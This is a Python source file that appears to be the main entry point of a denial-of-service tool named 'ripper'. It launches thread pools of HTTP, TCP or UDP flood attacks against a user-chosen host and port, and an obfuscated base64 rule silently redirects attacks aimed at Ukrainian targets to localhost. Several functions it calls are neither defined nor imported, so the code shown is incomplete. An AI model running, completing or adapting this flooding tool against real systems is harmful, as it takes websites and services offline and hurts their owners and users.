import curses
import threading
import time
import sys
from optparse import OptionParser
from base64 import b64decode
from typing import List
from colorama import Fore

from ripper import context, common
from ripper.context import Context
from ripper.attacks import down_it_http, down_it_tcp, down_it_udp
from ripper.common import (get_current_ip, get_no_successful_connection_error_msg,
                           print_usage, parse_args)
from ripper.constants import SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC, USAGE, EPILOG
from ripper.statistics import create_dashboard

_ctx = Context()


def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def update_url(_ctx: Context) -> None:
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"


def get_headers_dict(base_headers: List[str]) -> dict[str, str]:
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def update_current_ip(_ctx: Context) -> None:
    """Updates current ip"""
    _ctx.Statistic.connect.set_state_in_progress()
    _ctx.IpInfo.my_current_ip = get_current_ip()
    _ctx.Statistic.connect.set_state_is_connected()
    if _ctx.IpInfo.my_start_ip == '':
        _ctx.IpInfo.my_start_ip = _ctx.IpInfo.my_current_ip


def connect_host(_ctx: Context) -> None:
    _ctx.Statistic.connect.set_state_in_progress()
    try:
        sock = _ctx.sock_manager.create_tcp_socket()
        sock.connect((_ctx.host, _ctx.port))
    except:
        _ctx.Statistic.connect.failed += 1
    else:
        _ctx.Statistic.connect.success += 1
        sock.close()
    _ctx.Statistic.connect.set_state_is_connected()


def check_successful_connections(_ctx: Context) -> None:
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()

    if _ctx.Statistic.connect.success == _ctx.Statistic.connect.success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
    else:
        _ctx.Statistic.connect.last_check_time = curr_ms
        _ctx.Statistic.connect.sync_success()
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)


def check_successful_tcp_attack(_ctx: Context) -> None:
    """Checks if there are changes in sent bytes count."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()

    if _ctx.Statistic.tcp.packets_sent == _ctx.Statistic.tcp.packets_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
    else:
        _ctx.Statistic.tcp.connections_check_time = curr_ms
        _ctx.Statistic.tcp.sync_packets_sent()
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.host += '*'


def validate_input(args) -> bool:
    """Validates input params."""
    if int(args.port) < 0:
        print(f'{Fore.RED}Wrong port number.{Fore.RESET}')
        return False

    if int(args.threads) < 1:
        print(f'{Fore.RED}Wrong threads number.{Fore.RESET}')
        return False

    if not args.host:
        print(f'{Fore.RED}Host wasn\'t detected{Fore.RESET}')
        return False

    if str(args.attack_method).lower() not in ('udp', 'tcp', 'http'):
        print(f'{Fore.RED}Wrong attack type. Possible options: udp, tcp, http.{Fore.RESET}')
        return False

    return True


def validate_context(_ctx: Context) -> bool:
    """Validates context"""
    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
        print(f'{Fore.RED}Could not connect to the host{Fore.RESET}')
        return False

    return True


def connect_host_loop(_ctx: Context, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    while True:
        connect_host(_ctx)
        time.sleep(timeout_secs)


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        print_usage(parser)

    # Init context
    init_context(_ctx, args)
    update_host_ip(_ctx)
    update_current_ip(_ctx)
    _ctx.my_country = get_host_country(_ctx.current_ip)
    go_home(_ctx)

    if not validate_context(_ctx):
        sys.exit()

    time.sleep(.5)
    show_info(_ctx)

    _ctx.connections_check_time = time.time_ns()

    create_thread_pool(_ctx)

    if _ctx.attack_method == 'udp' and _ctx.port:
        thread = threading.Thread(target=connect_host_loop, args=[_ctx])
        thread.daemon = True
        thread.start()

    while True:
        time.sleep(1)
